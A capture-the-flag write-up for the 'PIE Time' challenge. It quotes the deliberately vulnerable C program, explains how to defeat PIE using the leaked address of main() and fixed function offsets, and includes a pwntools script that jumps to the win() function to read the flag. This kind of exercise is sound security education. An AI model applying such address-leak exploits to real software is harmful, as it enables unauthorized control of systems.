# PIE Time Challenge Solution

## Challenge Overview

"PIE Time" is a binary exploitation challenge where we need to bypass Position Independent Executable (PIE) protection to get the flag. PIE randomizes the base address of the binary at each execution, making it more difficult to predict where specific code will be located in memory.

## Understanding the Source Code (vuln.c)

Looking at the source code:

```c
#include <stdio.h>
#include <stdlib.h>
#include <signal.h>
#include <unistd.h>

void segfault_handler() {
  printf("Segfault Occurred, incorrect address.\n");
  exit(0);
}

int win() {
  FILE *fptr;
  char c;

  printf("You won!\n");
  // Open file
  fptr = fopen("flag.txt", "r");
  if (fptr == NULL)
  {
      printf("Cannot open file.\n");
      exit(0);
  }

  // Read contents from file
  c = fgetc(fptr);
  while (c != EOF)
  {
      printf ("%c", c);
      c = fgetc(fptr);
  }

  printf("\n");
  fclose(fptr);
}

int main() {
  signal(SIGSEGV, segfault_handler);
  setvbuf(stdout, NULL, _IONBF, 0); // _IONBF = Unbuffered

  printf("Address of main: %p\n", &main);

  unsigned long val;
  printf("Enter the address to jump to, ex => 0x12345: ");
  scanf("%lx", &val);
  printf("Your input: %lx\n", val);

  void (*foo)(void) = (void (*)())val;
  foo();
}
```

The program has three key functions:
1. `segfault_handler()`: Catches any segmentation faults that occur
2. `win()`: Opens and prints the contents of "flag.txt" - this is our target
3. `main()`: Prints its own address, asks for an address input, then jumps to that address

## The Vulnerability

The vulnerability is straightforward: the program allows us to directly specify an address to jump to via function pointer. The challenge is that PIE randomizes the base address, so we don't know the absolute address of the `win()` function.

However, the program gives us a critical piece of information - it prints out the address of the `main()` function with `printf("Address of main: %p\n", &main);`

## Exploitation Strategy

With PIE enabled, while the absolute addresses change each run, the *relative offsets* between functions remain the same. This means:

1. If we know the runtime address of `main()` (which the program tells us)
2. And we know the offset between `main()` and `win()` (which we can get from the binary)
3. Then we can calculate the runtime address of `win()`

The formula is:
```
win_runtime_address = main_runtime_address + (win_offset - main_offset)
```

## Implementing the Exploit

The exploit.py script works as follows:

1. Connect to the program
2. Parse the output to get the runtime address of `main()`
3. Calculate the offset between `main()` and `win()` from the binary
4. Calculate the runtime address of `win()`
5. Send this address when prompted
6. Receive and print the flag

```python
from pwn import *

# Set up connection to the target
conn = remote('challenge-server', port) # or process('./vuln')

# Receive the output until we get the main address
conn.recvuntil('Address of main: ')
main_addr_str = conn.recvline().strip().decode()
main_addr = int(main_addr_str, 16)

# Known offsets from binary analysis (objdump output)
# main_offset would be the location of main in the binary
# win_offset would be the location of win in the binary
main_offset = 0x11e9  # This needs to be replaced with actual value from objdump
win_offset = 0x1169   # This needs to be replaced with actual value from objdump

# Calculate base address of the binary
base_addr = main_addr - main_offset

# Calculate runtime address of win()
win_addr = base_addr + win_offset

# Send the win address when prompted
conn.recvuntil('Enter the address to jump to, ex => 0x12345: ')
conn.sendline(hex(win_addr).encode())

# Get the flag
conn.interactive()
```

## Conclusion

This challenge demonstrates a key concept in bypassing PIE protection: when we have an address leak (in this case, the address of `main()`), we can calculate the base address of the binary and then find the addresses of other functions like `win()`. The relative offsets between functions remain constant even though the absolute addresses change with each execution.